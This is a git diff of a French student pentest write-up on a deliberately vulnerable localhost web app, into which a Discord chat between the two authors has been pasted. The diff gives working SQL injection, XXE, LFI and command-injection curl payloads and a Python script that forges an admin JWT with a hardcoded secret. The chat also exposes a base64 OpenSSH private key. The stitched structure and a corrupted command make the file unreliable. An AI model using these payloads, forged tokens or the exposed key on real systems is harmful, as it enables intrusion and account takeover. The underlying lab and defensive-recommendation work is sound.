@@ -1,3 +1,247 @@
+yassmth
+aktsk__
+En ligne
+
+yassmth — 10/05/2025 16:20
+si t’as une solution je suis preneur
+yassmth — 11/05/2025 21:35
+yo y’a pas besoin d’imprimer
+djakolanterne — 11/05/2025 21:37
+ah ouai pk ? le format numérique fonctionne ?
+yassmth — 11/05/2025 21:45
+yes
+y’a pas marqué d’imprimer + c’est dans le mail directement
+djakolanterne — 11/05/2025 21:48
+j'avais lu dans un des mails, merci de vous munir de votre convocation
+je sais plus lequel
+ok j'vois
+en fait faut aller la récupérer ^^
+c good
+yassmth — 11/05/2025 22:35
+yesss
+yassmth — 11/05/2025 22:35
+effectivement good
+yassmth — 12/05/2025 12:42
+14h ca te va ?
+djakolanterne — 12/05/2025 12:46
+yes
+djakolanterne — 12/05/2025 14:28
+DesUntrData_menu() {
+  echo ""
+  echo "--- Deserialization of Untrusted Data (DUD) ---"
+  echo "1. "
+  echo "2. Back"
+  echo "3. Vuln discovery"
+  read -e -p "Choose an action: " option
+
+  case $option in
+    1)
+      run_cmd "dirb https://localhost:3000/employee?i= /home/olantern/Desktop/Projet_Light_Apps/SqlInj>"
+      ;;
+    2)
+      run_cmd
+      ;;
+    3)
+      run_cmd "ffuf -u https://localhost:3000/invoice -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H '>
+      ;;
+    4)main_menu
+      ;;
+    *)
+      echo "Invalid option"
+      ;;
+  esac
+}
+djakolanterne — 12/05/2025 17:05
+Image
+djakolanterne — 13/05/2025 14:50
+b3B1bnNzaC1rZXktdj EAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAAAAABN1Y2RZYS
+1zaGEyLW5pc3RwNTIXAAAACG5pc3RwNTIxAAAAhQQABQLd7b/GOJBD7hznwa9Zu1I1XZbZ
+9q/fRE8D6F485XSTACCgmH3SKHWAIBCWGyftcN5 JACDCMRISGRyrdeZyXHYBsrp1x6TBpf
+UK7VQ45J+b8zIMMenbWeNs JP1mQvAVwbNuZ7VX1aGLv9PCwLwAIYOQeCLKj FM2kPNAdSh7 7dhkHrsAAAEIG/cdoxv3HaMAAAATZWNkc2Etc2hhMi1uaXN0cDUyMQAAAAhuaXN0cDUyMQ AAAIUEAAUC3e2/xjiQQ+4c58GvWbt SNV2W2fav30RPA+he POVOkwAgo Jh90ih8ACAQ1hsn 7XDeSQAgwj Ea7Bkcq3Xmc1x2AbK6dcekwaX1Cu1U00Sfm/MyDDHp21njbCT9ZkLwFcGzbm e1V9Whi7/Tws C8ACGNEHgiyoxTNpDzQHUoe+3YZB67AAAAQQh848+d9ckNCcAhRBDvdXBW
+UCTXAU1zQzEkYfX32pmezCeyg20T7krj JV3xL7Yov7tVUS2VyEtDpxXWcGLEMMBYAAAACN
+NweUBZZWNyZXQB
+yassmth — 13/05/2025 14:51
+b3B1bnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAAAAABN1Y2RZYS1zaGEyLW5pc3RwNTIXAAAACG5pc3RwNTIxAAAAhQQABQLd7b/GOJBD7hznwa9Zu1I1XZbZ9q/fRE8D6F485XSTACCgmH3SKHWAIBCWGyftcN5JACDCMRISGRyrdeZyXHYBsrp1x6TBpfUK7VQ45J+b8zIMMenbWeNsJP1mQvAVwbNuZ7VX1aGLv9PCwLwAIYOQeCLKjFM2kPNAdSh77dhkHrsAAAEIG/cdoxv3HaMAAAATZWNkc2Etc2hhMi1uaXN0cDUyMQAAAAhuaXN0cDUyMQAAAIUEAAUC3e2/xjiQQ+4c58GvWbtSNV2W2fav30RPA+hePOVOkwAgoJh90ih8ACAQ1hsn7XDeSQAgwjEa7Bkcq3Xmc1x2AbK6dcekwaX1Cu1U00Sfm/MyDDHp21njbCT9ZkLwFcGzbme1V9Whi7/TwsC8ACGNEHgiyoxTNpDzQHUoe+3YZB67AAAAQQh848+d9ckNCcAhRBDvdXBWUCTXAU1zQzEkYfX32pmezCeyg20T7krjJV3xL7Yov7tVUS2VyEtDpxXWcGLEMMBYAAAACNNweUBZZWNyZXQB
+djakolanterne — Hier à 09:59
+https://www.linuxandubuntu.com/home/kali-linux-stuck-at-black-screen-on-boot/#:~:text=After%20the%20installation%20has%20run%20successfully,%20reboot%20your,‘%20and%20ends%20with%20‘quiet%20splash’%20or%20‘splash’.
+LinuxAndUbuntu
+[Fixed] Kali Linux Stuck At Black Screen On Boot
+Kali Linux is the best Linux distribution for penetration testing. It has almost every tool you need to test your system against hundreds of vulnerabilities.
+
+
+
+
+
+Recently, I saw a few questions floating around the internet about Kali Linux not being able to boot correctly. To run into the problem, I
+[Fixed] Kali Linux Stuck At Black Screen On Boot
+djakolanterne — Hier à 12:19
+https://linux-audit.com/cheat-sheets/curl/
+djakolanterne — Hier à 12:44
+#!/bin/bash
+COWLIST="/home/olantern/Desktop/Projet_Light_Apps/Cowlist/cowlist.txt"
+RANDOM_COW=$(shuf -n 1 "$COWLIST")
+MESSAGE="Welcome, hacker..."
+
+# Génère le cowsay avec le cow aléatoire
+Afficher plus
+Destroyer.sh
+6 Ko
+curl -ik https://localhost:3000/login \
+  -H "Content-Type: application/json" \
+  -d '{"user": "'''OR username LIKE '''crocks", "passwd": "re"}'
+import jwt
+import time
+
+
+secret = "7E91A318E0BCA7601717E409E86342D8AA7B54AE1BE4033577921B2B1D09F57B"
+
+payload = {
+    "Id": "admin",
+    "IsAdmin": "True",
+    "nbf": int(time.time()),
+    "iat": int(time.time()),
+    "exp": int(time.time()) + 7200
+}
+
+token = jwt.encode(payload, secret, algorithm="HS256")
+
+print(f"Moi Être Admin : {token}")
+djakolanterne — Hier à 22:17
+il faudra rajouter si possible la vulné LFI, & la XSS, ( pas préssé ) on termine demain et on envoie demain
+genre juste rajouter le template, comme t'as fais pr les autres vulnés
+
+
+# ⬇️ Vulnérabilités trouvées en utilisant le scanner snyk.io
+
+
+Afficher plus
+message.txt
+23 Ko
+pour l'instant y'en a 6 de renseignées, mais y'en a qui sont quasi gratos donc demain y'en aura disons minimum 5 de plus 
+djakolanterne — Hier à 22:26
+ou sinon jle ferai demain c good 
+djakolanterne — 13:46
+j'ai bien le teams du coup, par contre y'a pas de réunion dans nos calendar
+j'imagine qu'il la fera en temps et en heure
+yassmth — 13:54
+c’est bien ça
+je pense qu’il va lancer une visio sur l’équipe
+djakolanterne — 14:08
+il fallait lui envoyer qq chose ?
+ou il parle des rapports qu'on avait déjà fait
+yassmth — 14:10
+alors là aucune idée
+je m’étais absenté il a dit quoi dessus ?
+djakolanterne — 14:29
+rien de spécial
+j'essaie de rajouter les vulnés en parallèles
+moyen que tu formates comme il faut une fois que j'aurai finis ? par contre vu qu'il y a des qcm etc j'pense ça sera pas avant ce soir
+yassmth — 14:30
+yes ca marche
+effectivement pas avant ce soir du coup dommage
+djakolanterne — 14:31
+ouai et faut l'envoyer ajd tfaçon sinon c 0 xd
+yassmth — 14:43
+non il m’a dit qu’on a la journée demain aussi
+djakolanterne — 18:57
+t vrmt sûr ?
+il avait dit avant le 16 pourtant dans le msg discord
+yassmth — 18:59
+oui sûr et certain je lui ai demandé à la fî du cours
+yassmth — 19:00
+yes je sais bien, c’est pas plus mal franchement
+djakolanterne — 19:01
+ué c sûr, mais bon
+yassmth — 21:32
+c’est la nouvelle version du readme ou c’est ce qu’il fait ajouter ?
+je te mets les droits de commit dans 5-10 minutes
+djakolanterne — 21:42
+
+Pour repérer les vulnérabilités dans l'application, on a utilisé Snyk, pour réaliser une analyse du code source. Ce qui nous a permis de repérer plusieurs failles critiques.
+
+Mais d'un point de vue plus réaliste, on a décidé de privilégier l'éxploitation des vulnérabilités via des requêtes curl, pour tenter de simuler un scénario black box, où on ne dispose d'aucune informations.
+L'étape de la reconnaissance ( faite grâce à plusieurs outils, tels que dirb, ffuf, scripts pythons... ) était donc primordiale pour tenter de trouver des vulnérabilités, et les éxploiter par la suite.
+Afficher plus
+message.txt
+18 Ko
+le nouveau
+j'ai retiré tout le chatgpt
+yassmth — 21:42
+il faut que tu acceptes l'invit d'abord
+Image
+djakolanterne — 21:42
+j'ai juste gardé les fire, mais j'pense les virer
+j'ai pu tout réécrire comme il fallait, sans utiliser chatgpt
+yassmth — 21:43
+pas mal du tout, merci pour les travaux
+djakolanterne — 21:46
+
+Pour repérer les vulnérabilités dans l'application, on a utilisé Snyk, pour réaliser une analyse du code source. Ce qui nous a permis de repérer plusieurs failles critiques.
+
+Mais d'un point de vue plus réaliste, on a décidé de privilégier l'éxploitation des vulnérabilités via des requêtes curl, pour tenter de simuler un scénario black box, où on ne dispose d'aucune informations.
+L'étape de la reconnaissance ( faite grâce à plusieurs outils, tels que dirb, ffuf, scripts pythons... ) était donc primordiale pour tenter de trouver des vulnérabilités, et les éxploiter par la suite.
+Afficher plus
+message.txt
+18 Ko
+voila la version finale
+si tu veux ajuster pour faire plus beau go, par contre faut pas ajouter de chatgpt
+merde c ultra moche dans le readme wtf
+yassmth — 21:48
+c'est commit
+je m'occupe de le rendre plus beau tkt
+djakolanterne — 21:48
+le premier paragraphe normalement les slash c une ligne
+c genre un slash par ligne
+ok
+ça doit être bien comme ça du coup cette partie
+Image
+ah merde
+j'ai oublié la sql injection
+jla fais puis jte l'envoie par chat ?
+yassmth — 21:50
+ah ouai ça a rien à voir
+Image
+yassmth — 21:50
+vas y
+djakolanterne — 22:16
+c good
+tu commit et jrajoute directement sur ton github ou ?
+ou jte l'envoie là
+enfin si t'as pas encore fais des modifs :
+
+Pour repérer les vulnérabilités dans l'application, on a utilisé Snyk, pour réaliser une analyse du code source. Ce qui nous a permis de repérer plusieurs failles critiques.
+
+Mais d'un point de vue plus réaliste, on a décidé de privilégier l'éxploitation des vulnérabilités via des requêtes curl, pour tenter de simuler un scénario black box, où on ne dispose d'aucune informations.
+L'étape de la reconnaissance ( faite grâce à plusieurs outils, tels que dirb, ffuf, scripts pythons... ) était donc primordiale pour tenter de trouver des vulnérabilités, et les éxploiter par la suite.
+Afficher plus
+message.txt
+20 Ko
+sinon prends juste la partie sql
+yassmth — 22:19
+c'est la version entière ?
+djakolanterne — 22:19
+yes, cette fois y'a vrmt tout
+par contre faut juste modif les premiers trucs là att
+yassmth — 22:20
+ok
+fais ta modif et je recommit tout
+djakolanterne — 22:22
+commit ça 
+et dis moi si le rendu est mieux au début
+Gérard Galmar / Yassine Abdaoui
+
+Pour repérer les vulnérabilités dans l'application, on a utilisé Snyk, pour réaliser une analyse du code source. Ce qui nous a permis de repérer plusieurs failles critiques.
+
+Mais d'un point de vue plus réaliste, on a décidé de privilégier l'éxploitation des vulnérabilités via des requêtes curl, pour tenter de simuler un scénario black box, où on ne dispose d'aucune informations.
+L'étape de la reconnaissance ( faite grâce à plusieurs outils, tels que dirb, ffuf, scripts pythons... ) était donc primordiale pour tenter de trouver des vulnérabilités, et les éxploiter par la suite.
+Afficher plus
+message.txt
+20 Ko
+voila là c vrmt le final du final
+j'ai mis nos noms & ajusté les dernières modifs 
+﻿
+Gérard Galmar / Yassine Abdaoui
+
 Pour repérer les vulnérabilités dans l'application, on a utilisé Snyk, pour réaliser une analyse du code source. Ce qui nous a permis de repérer plusieurs failles critiques.
 
 Mais d'un point de vue plus réaliste, on a décidé de privilégier l'éxploitation des vulnérabilités via des requêtes curl, pour tenter de simuler un scénario black box, où on ne dispose d'aucune informations.
@@ -7,19 +251,28 @@ L'étape de la reconnaissance ( faite grâce à plusieurs outils, tels que dirb,
 
 Dirb, ffuf
 
-dirb https://localhost:3000 /usr/share/wordlists/seclists/Fuzzing/fuzz-Bo0oM.txt -w -H "Authorization: Bearer (Token Here)"
+irb https://localhost:3000 /usr/share/wordlists/seclists/Fuzzing/fuzz-Bo0oM.txt -w -H "Authorization: Bearer (Token Here)"
 
 ---> /login
+
 ---> /swagger
+
 ---> /swagger/index.html
+
 ---> /swagger/v1/swagger.json
+
 dirb https://localhost:3000 /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -w -H "Authorization: Bearer (Token Here)"
 
 ---> /login
+
 ---> /client
+
 ---> /contract
+
 ---> /employee
+
 ---> /invoice
+
 ---> /patch
 
 
@@ -29,7 +282,56 @@ ffuf -u https://localhost:3000/?FUZZ=test  -H 'Content-Type: application/json' -
 Un script résumant toutes les actions entreprises a également été fait en bash afin de structurer notre travail.
 Vous pourrez utiliser ce script afin de voir plus clairement comment on s'est organisé pour réaliser cette opération.
 
-###  1. Exposure of Sensitive Information to an Unauthorized Actor (CWE-200)
+###  1 SQL injection (CWE-89)
+
+Comme c'est une page simple de login, on sait déjà du premier coup d'oeil, qu'on doit tenter une injection sql.
+
+En curl, on tente en premier lieu de voir quel champ est injectable :
+
+curl -ik https://localhost:3000/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "re", "password": "'\''"}'
+
+Par chance, le serveur nous retourne une réponse intéréssante : 
+
+---> at VulnerableWebApplication.VLAIdentity.VLAIdentity.VulnerableQuery(String User, String Passwd)
+
+On connait donc, grâce à cette mauvaise gestion des erreurs, le nom des champs, qui sont "User" et "Passwd".
+
+On retente donc ensuite de voir quel champ est injectable, avec les bons champs :
+
+--> curl -ik https://localhost:3000/login \
+  -H "Content-Type: application/json" \
+  -d '{"user": "'rr'", "passwd": "'\''"}'
+
+Comme le champ passwd n'est pas injectable :
+
+curl -ik https://localhost:3000/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "'\''", "password": ""}'
+
+On découvre maintenant que le champ user est injectable
+
+On trouve ensuite le nom des colonnes encore grâce aux erreurs indiquées : 
+
+curl -ik https://localhost:3000/login \
+  -H "Content-Type: application/json" \
+  -d '{"user": "'\''OR username LIKE '\''crocks", "passwd": "re"}'
+  
+  ---> System.Data.EvaluateException: Cannot find column [username]
+  
+  On cherche ensuite le nom des colonnes encore grâce aux erreurs indiquées, et on trouve finalement user & passwd.
+
+  On récupère ensuite un token d'authentification grâce à une requête réussie.
+  
+curl -ik https://localhost:3000/login \
+  -H "Content-Type: application/json" \
+  -d '{"user": "'\''OR user LIKE '\''e%", "passwd": "re"}'
+
+Comme nous n'avons pas réussi à utiliser hydra, on a réalisé un script réalisé en python, et on a pu bruteforce la table user, afin de trouver un maximum de noms d'utilisateurs.
+Concernant les mots de passe, ils sont probablement stockés sous forme de hash, il fallait donc trouver un moyen de dump la base de donnée, ou retenter un brute force avec la liste des bons utilisateurs, sur le champ password.
+
+###  2. Exposure of Sensitive Information to an Unauthorized Actor (CWE-200)
 
 ### Commentaire :
 
@@ -44,7 +346,9 @@ Requête pour récupérer le contenu /etc/passwd :
 La requête ici fonctionne éxeptionnellement avec des "/" pour ce genre de répertoires, je suppose que c'est parcequ'on peut accéder à /etc/passwd depuis n'importequel path, ce qui fait que ça bypass le fait que ces caractères soient interdits.
 
 
-###  2-3. Deserialization of Untrusted Data (CWE-502) + Code injection (CWE-94)
+
+
+###  3-4. Deserialization of Untrusted Data (CWE-502) + Code injection (CWE-94)
 
 Ici, on commence d'abord par éxécuter une commande curl simple, sur l'url https://localhost:3000/invoice/, et on constate rapidement qu'on obtient erreur 405 ( method not allowed ).
 
@@ -70,7 +374,7 @@ Par manque d'éxperience, cette vulnérabilité n'a pas pu être éxploitée jus
 Recommandations : Ne pas utiliser JsonConvert.DeserializeObject sur des données provenant de l’utilisateur sans validation stricte du format ( et du type ) attendu.
 
 
-###  4. XML Injection (CWE-91)
+###  5. XML Injection (CWE-91)
 
 
 Concernant l'injection XML, on a pu identifier l'url /contract qui retournait des erreurs liées à xml, lorsqu'on tentait de rentrer une valeur aléatoire au paramètre i.
@@ -86,7 +390,7 @@ L'injection peut être poussée bien plus loin, en injectant des balises supplé
 Recommandations : Désactiver le traitement des DTD, utiliser des parseurs XML sécurisés... ---> XmlReader avec DtdProcessing.Prohibit
 
 
-###  5. Utilisation de secrets codés en dur (CWE-798)
+###  6. Utilisation de secrets codés en dur (CWE-798)
 
 
 On a pu trouver cette vulnérabilité à partir de deux autres, injection sql pour trouver un token d'authentification ( qui correspondraient à un user admin dans un cas réel ) , et de la vulnérabilité LFI.
@@ -105,10 +409,10 @@ Recommandations : Ne jamais stocker de secrets en dur dans le code source, ou da
 Utiliser par exemple des gestionnaires de secrets sécurisés ( HashiCorp Vault, AWS Secrets Manager...)
 
 
-###  6-7. SSRF (CWE-94) + XXE Injection (CWE-611)
+###  7-8. SSRF (CWE-94) + XXE Injection (CWE-611)
 
 
-#### 6. XXE (XML External Entity)
+#### 7. XXE (XML External Entity)
 
 Explication : Le parseur XML peut traiter des entités externes définies dans l’input, ce qui permettrait à un attaquant d’accéder à des fichiers locaux ou de provoquer des requêtes vers des ressources internes.
 
@@ -131,7 +435,7 @@ curl -k https://localhost:3000/Contract?i=%3C%3Fxml%20version%3D%221.0%22%20enco
 Nous récupérons donc bien par la suite le contenu de etc/passwd, en appellant l'entité file.
 
 
-###  7. Server-Side Request Forgery (SSRF) (CWE-918) // Indirectement : URL Injection (CWE-601)
+### 8. Server-Side Request Forgery (SSRF) (CWE-918) // Indirectement : URL Injection (CWE-601)
 
 
 - **Snyk :** Une requête HTTP est effectuée en fonction d’une URL potentiellement contrôlée par l'utilisateur.  
@@ -158,7 +462,7 @@ Avec cette méthode, qui contourne souvent les protections ( car les droits sont
 Recommendations : Valider et filtrer les url fournies par l'utilisateur, désactiver les fonctionnalités du parser XML (XmlResolver ) pour empêcher les appels réseau inités via des entités éxternes ( XXE --> SSRF )
 
 
-###  8-9. Local File Intrusion (CWE-829) // Path Traversal (CWE-22)
+###  9-10. Local File Intrusion (CWE-829) // Path Traversal (CWE-22)
 
 
 -Explications : Un utilisateur peut manipuler le paramètre "lang" pour accéder à des fichiers système ou sensibles.
@@ -180,7 +484,7 @@ La requête fonctionne avec lang=/etc/passwd, mais si on a des soucis par la sui
 Recommandation : Utiliser une liste blanche de fichiers autorisés plutôt qu'une blacklist, bloquer toute les types de séquences, ne pas inclure directement des chemins ou noms de fichiers fournis par l'utilisateur sans validation, et configurer les permissions pour qu'en cas de faille, les fichiers ne soient pas lisibles par l'application.
 
 
-###  10. Insecure Direct Object Reference (IDOR) (CWE-639)
+###  11. Insecure Direct Object Reference (IDOR) (CWE-639)
 
 
 Explications : Le paramètre "Id" est utilisé directement pour retrouver un utilisateur sans vérification d’autorisation. ça permet donc à un utilisateur malveillant d'accéder à des données d'autres employés en changeant l'ID dans la requête.  
@@ -198,7 +502,7 @@ On découvre ensuite des données confidentielles d'une quinzaine d'employés.
 Recommandations : Implémenter une logique d’autorisation stricte basée sur l’utilisateur connecté, et vérifier que l’ID demandé lui appartient.
 
 
-###  11. Command Injection (CWE-77)
+###  12. Command Injection (CWE-77)
 
 
 - Explications: Le paramètre `UserStr` est utilisé pour construire une commande shell sans échappement. Un attaquant pourrait donc injecter une commande arbitraire après l'appel "nslookup", conduisant à l'éxécution de commandes systèmes non prévues.
@@ -214,7 +518,7 @@ Après avoir tenté un dirb pour trouver un paramètre valide, on comprend que l
 Recommandation : Ne jamais insérer de chaînes utilisateur dans une commande shell ( never trust user ). Utiliser des API sécurisées pour DNS, ou échapper correctement les arguments.
 
 
-###  12. GraphQL (CWE-200)
+###  13. GraphQL (CWE-200)
 
 
 - Explications: L’interface GraphQL est exposée publiquement. ça permet donc à un attaquant d'éxplorer toute l'API GraphQL.
@@ -256,3 +560,6 @@ Dans un scénario élaboré, on aurait peut être pu entrevoir la possibilité d
 Mais le message "CSRF_PROTECTION" en réponse, lors de l'éxploitation de la vulnérabilité, nous laisse croire qu'une protection a été prévue pour.
 
 Recommandations : Restreindre les requêtes du genre "__schema", qui permettent d'éxplorer toute l'api, filtrer les champs éxposés selon les rôles, sanitiser les entrées utilisateurs, protection anti CSRF ( graphql-require-prelight ).
+ 
+message.txt
+20 Ko
